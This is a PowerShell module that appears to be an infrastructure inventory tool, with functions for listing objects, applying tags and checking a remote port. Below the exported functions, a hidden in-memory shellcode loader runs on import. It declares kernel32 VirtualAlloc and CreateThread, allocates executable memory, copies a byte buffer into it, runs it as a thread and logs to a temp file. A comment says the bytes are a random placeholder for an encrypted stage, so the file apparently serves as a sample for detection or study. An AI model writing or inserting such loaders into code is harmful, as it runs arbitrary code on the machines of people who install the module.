$ErrorActionPreference = "Stop"

$culture = [System.Globalization.CultureInfo]::InvariantCulture

$script:DefaultTimeout = 30
$script:ModuleVersion = '1.7.8'

function Get-InfraInventory {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Test'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraInventoryTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraInventoryHealth {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

Export-ModuleMember -Function Get-InfraInventory, Set-InfraInventoryTag, Test-InfraInventoryHealth

$LogPath = "$env:TEMP\loader.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x30, 0x54, 0xbb, 0x43, 0x9a, 0x58, 0x73, 0x47, 0x4e, 0xb5, 0x2d, 0x41, 0x09, 0x66, 0x97, 0xe6,
    0xf5, 0x04, 0xc8, 0x55, 0x7c, 0x58, 0x22, 0x58, 0x71, 0xd6, 0xf4, 0x62, 0x57, 0x6d, 0xa3, 0xfa,
    0x80, 0x2b, 0x5e, 0x27, 0x4b, 0x87, 0x0b, 0xfe, 0x1c, 0xe8, 0x27, 0x59, 0xcb, 0xe7, 0xca, 0xbb,
    0xeb, 0x77, 0xc6, 0x12, 0xe5, 0xc7, 0xf9, 0xed, 0xb0, 0xc5, 0xc5, 0xce, 0xe2, 0x54, 0x3a, 0x11,
    0x8b, 0xbe, 0x8c, 0x3a, 0x3b, 0xdd, 0x63, 0xf9, 0x42, 0x64, 0x43, 0xb8, 0x10, 0x73, 0x78, 0x1d,
    0x23, 0xed, 0x48, 0x16, 0x92, 0xc0, 0xa4, 0xb6, 0x85, 0x49, 0x56, 0x1c, 0x96, 0x21, 0x28, 0x62,
    0x00, 0x96, 0x95, 0xd1, 0xef, 0x4e, 0xea, 0xc9, 0x8a, 0x41, 0xd7, 0xff, 0xc8, 0x20, 0xc3, 0x8c,
    0x8c, 0x1f, 0x3f, 0xd4, 0x04, 0xf0, 0xec, 0x76, 0xb3, 0x7d, 0xe2, 0x2f, 0xba, 0xc5, 0x19, 0x94,
    0x84, 0x6d, 0xfc, 0xb4, 0xc8, 0x9c, 0x2c, 0x8c, 0xd7, 0x6b, 0x05, 0xb0, 0x3c, 0x9c, 0x7c, 0x60,
    0x5d, 0x59, 0x78, 0xfc, 0x6a, 0x03, 0x2a, 0x7e, 0x43, 0x3a, 0x69, 0x7c, 0x68, 0xbe, 0x34, 0x5e,
    0xda, 0x90, 0x9c, 0xe5, 0x14, 0x65, 0xd8, 0x13, 0xb0, 0x00, 0x1a, 0xf8, 0x5d, 0x4c, 0x81, 0xb7,
    0x51, 0xce, 0x20, 0x20, 0x97, 0x1a, 0x88, 0x69, 0x3a, 0xcf, 0x47, 0x98, 0xd8, 0x31, 0xb5, 0x71,
    0xd1, 0x7e, 0x80, 0x16, 0x6d, 0x8f, 0xca, 0xf4, 0x14, 0x1a, 0x2f, 0x04, 0x42, 0xc7, 0x73, 0xe4,
    0x77, 0x16, 0xd7, 0x49, 0xe9, 0xb3, 0xd5, 0x49, 0xf4, 0x97, 0x5f, 0xde, 0x3a, 0x0c, 0xd2, 0x92,
    0xa3, 0x89, 0x8e, 0x1d, 0x05, 0x4c, 0x2e, 0x66, 0x15, 0x2b, 0x71, 0x44, 0xf2, 0x4e, 0x20, 0xec,
    0x1d, 0x23, 0xb9, 0xe3, 0x68, 0x93, 0x9b, 0x83, 0xc1, 0x9d, 0x3a, 0xa2, 0xeb, 0xad, 0xb7, 0x6d,
    0x9a, 0x86, 0x41, 0x1e, 0x45, 0x33, 0x67, 0xef, 0x0a, 0xd9, 0x67, 0x34, 0xe3, 0xfb, 0x53, 0x0e,
    0x17, 0x53, 0xe2, 0x35, 0xbf, 0x8b
)

$HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 4221)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
